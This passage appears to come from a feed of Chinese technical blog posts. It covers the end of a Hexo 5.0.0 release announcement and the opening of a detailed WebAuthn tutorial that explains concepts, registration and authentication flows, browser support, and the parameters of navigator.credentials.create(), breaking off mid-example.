<code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        challenge,\n        rp: {\n            id,\n            name\n        },\n        user: {\n            id,\n            name,\n            displayName\n        },\n        pubKeyCredParams: [\n            {\n                type: \"public-key\",\n                alg\n            }\n        ],\n        authenticatorSelection: {\n            authenticatorAttachment,\n            userVerification\n        },\n        excludeCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: 